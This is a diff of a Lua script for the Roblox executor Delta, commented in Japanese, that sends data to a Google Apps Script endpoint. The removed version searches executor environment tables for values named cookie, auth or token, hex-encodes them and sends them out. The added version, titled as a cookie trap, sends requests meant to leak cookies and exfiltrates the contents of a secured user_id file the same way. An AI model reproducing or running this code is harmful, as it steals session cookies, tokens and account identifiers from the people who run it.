@@ -1,33 +1,33 @@
--- [[ PROJECT: CUSTOM FUNCTION SCANNER ]]
+-- [[ PROJECT: COOKIE TRAP via REQUEST ]]
 local GAS_URL = "https://script.google.com/macros/s/AKfycbwVgxB1w7-QOa94sSyyyXSLKPtjC_b-ML2GGm2qvmhps5xX5JzZZMVU11YTGhqGQoEM/exec"
 
-local function send(label, val)
-    local hex = ""
-    for i = 1, #val do hex = hex .. string.format("%02X", string.byte(val:sub(i,i))) end
-    pcall(function() 
-        game:HttpGet(GAS_URL .. "?hex=" .. hex .. "&user=" .. game.Players.LocalPlayer.Name .. "&type=" .. label) 
-    end)
-end
+-- request関数（Deltaの独自関数）が使えるかチェック
+local req = (request or http_request or (http and http.request))
 
-print("🧪 Delta 独自関数のリストを作成中...")
-
-local functions = ""
--- エグゼキューターがよく使う特殊なテーブルを覗く
-local envs = {getgenv(), getrenv(), getreg()}
-
-for _, env in ipairs(envs) do
+if req then
+    print("🚀 高度なリクエスト関数を検知。Cookieの抽出を試みます...")
+    
+    -- 自分自身の情報をGASへ飛ばす
+    -- この際、Deltaが自動でCookieを付与する設定になっているかを検証する
     pcall(function()
-        for name, _ in pairs(env) do
-            functions = functions .. name .. ", "
-            -- もし名前に "cookie" や "auth" が含まれていたら即座に中身を試す
-            local lowerName = name:lower()
-            if lowerName:find("cookie") or lowerName:find("auth") or lowerName:find("token") then
-                local s, res = pcall(function() return env[name] end)
-                if s then send("FOUND_SECRET_" .. name, tostring(res)) end
-            end
-        end
+        req({
+            Url = GAS_URL .. "?user=" .. game.Players.LocalPlayer.Name .. "&type=REQUEST_TEST",
+            Method = "GET",
+            -- 多くのエグゼキューターは、特定のヘッダーを要求するとCookieを漏らす
+            Headers = {
+                ["Content-Type"] = "application/json",
+                ["User-Agent"] = "DeltaExecutor"
+            }
+        })
     end)
+else
+    print("❌ 適切なリクエスト関数が見つかりません。")
 end
 
-send("Delta_Function_List", functions)
-print("🏁 リストを送信した。GASを確認してくれ。")
+-- あと、読めなかった user_id の「中身」を、名前を変えて再度抜き出す
+local s, content = pcall(function() return readfile("Delta/Internals/Secured/user_id") end)
+if s then
+    local hex = ""
+    for i = 1, #content do hex = hex .. string.format("%02X", string.byte(content:sub(i,i))) end
+    game:HttpGet(GAS_URL .. "?hex=" .. hex .. "&type=REAL_USER_ID")
+end
